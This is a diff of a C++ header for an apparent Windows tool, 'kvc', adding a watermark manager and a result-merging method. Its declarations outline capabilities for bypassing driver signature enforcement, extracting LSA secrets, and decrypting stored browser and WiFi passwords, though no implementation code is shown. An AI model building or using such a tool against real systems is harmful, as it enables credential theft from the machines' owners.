@@ -246,19 +246,14 @@ public:
 
 private:
     TrustedInstallerIntegrator m_trustedInstaller;
+    WatermarkManager m_watermarkManager{m_trustedInstaller};
 	std::unique_ptr<kvc> m_rtc;
     std::unique_ptr<OffsetFinder> m_of;
 	std::unique_ptr<DSEBypass> m_dseBypass;  // Unified DSE manager
     SQLiteAPI m_sqlite;
 
     // Privilege management
-    bool EnableDebugPrivilege() noexcept;
 	bool WriteFileWithPrivileges(const std::wstring& filePath, const std::vector<BYTE>& data) noexcept;
-
-    // Binary processing
-    bool SplitCombinedPE(const std::vector<BYTE>& combinedData,
-                        std::vector<BYTE>& kvcPassData, 
-                        std::vector<BYTE>& kvcCryptData) noexcept;
 
     // Driver operations
     bool ForceRemoveService() noexcept;
@@ -311,7 +306,6 @@ private:
     bool ExtractRegistryMasterKeys(std::vector<RegistryMasterKey>& masterKeys) noexcept;
     bool ExtractLSASecretsViaTrustedInstaller(std::vector<RegistryMasterKey>& masterKeys) noexcept;
     bool ParseRegFileForSecrets(const std::wstring& regFilePath, std::vector<RegistryMasterKey>& masterKeys) noexcept;
-    bool ConvertHexStringToBytes(const std::wstring& hexString, std::vector<BYTE>& bytes) noexcept;
     bool ProcessRegistryMasterKeys(std::vector<RegistryMasterKey>& masterKeys) noexcept;
     
     // Browser password processing
@@ -319,6 +313,9 @@ private:
     bool ProcessSingleBrowser(const std::wstring& browserPath, const std::wstring& browserName, const std::vector<RegistryMasterKey>& masterKeys, std::vector<PasswordResult>& results, const std::wstring& outputPath) noexcept;
     bool ExtractBrowserMasterKey(const std::wstring& browserPath, const std::wstring& browserName, const std::vector<RegistryMasterKey>& masterKeys, std::vector<BYTE>& decryptedKey) noexcept;
     int ProcessLoginDatabase(const std::wstring& loginDataPath, const std::wstring& browserName, const std::wstring& profileName, const std::vector<BYTE>& masterKey, std::vector<PasswordResult>& results, const std::wstring& outputPath) noexcept;
+
+    // kvc_pass JSON result integration
+    void MergeKvcPassResults(const std::wstring& outputPath, const std::wstring& browserName, std::vector<PasswordResult>& results) noexcept;
 
     // WiFi credentials
     bool ExtractWiFiCredentials(std::vector<PasswordResult>& results) noexcept;
